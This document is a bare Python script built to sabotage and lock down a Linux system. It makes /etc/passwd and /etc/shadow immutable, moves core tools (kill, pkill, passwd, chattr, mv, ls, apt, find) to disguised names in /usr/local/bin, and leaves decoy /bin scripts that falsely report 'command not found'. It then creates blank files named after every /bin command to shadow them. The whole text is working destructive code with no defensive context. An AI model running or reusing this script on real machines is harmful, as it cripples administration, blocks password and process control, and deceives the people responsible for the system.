import os
import shutil
import subprocess

def change_command_name(original_name, new_name):
    # Check if the original command exists
    original_path = shutil.which(original_name)
    if not original_path:
        print(f"Error: The command '{original_name}' does not exist.")
        return

    # Check if the new name is not already in use
    new_path = shutil.which(new_name)
    if new_path:
        print(f"Error: The command '{new_name}' already exists. Choose a different name.")
        return

    try:
        # Rename the command by moving it to the new name
        os.rename(original_path, f'/usr/local/bin/{new_name}')
        print(f"Command name changed successfully. You can now use '{new_name}' instead of '{original_name}'.")
    except Exception as e:
        print(f"An error occurred: {e}")
        
#Creates a dummy copy of the changed command in /bin
def create_decoy_file(command_name):
    script_content = f"""#!/bin/bash
    echo "{command_name}: command not found"
    """

    file_path = f"/bin/{command_name}"
    with open(file_path, "w") as file:
        file.write(script_content)

    # Make the file executable
    os.system(f"chmod +x {file_path}")

    print(f"The script has been created at {file_path}.")

#Make any file immutable
def make_immutable(file_path):
    try:
        # Use subprocess to run the chattr command
        subprocess.run(["chattr", "+i", file_path], check=True)
        print(f"File '{file_path}' is now immutable.")
    except subprocess.CalledProcessError as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    make_immutable("/etc/passwd")
    make_immutable("/etc/shadow")
    files = []
    try:
        directory = "/bin"
        # Get a list of all files in the specified directory
        files = os.listdir(directory)   
    except FileNotFoundError:
        print(f"Error: Directory '{directory}' not found.")
    commands = ["chattr", "passwd", "mv", "kill", "skill", "pkill", "xkill", "find", "killall", "apt", "ls"]
    renamed_commands = ["imut", "pass", "move", "die", "sdie", "pdie", "xdie", "search", "dieall", "trigger", "list"]
    for i in range(len(commands)):
        change_command_name(commands[i], renamed_commands[i])
        create_decoy_file(commands[i])
    for command in files:
        with open(f"/usr/local/bin/{command}", "w") as file:
            file.write(" ")
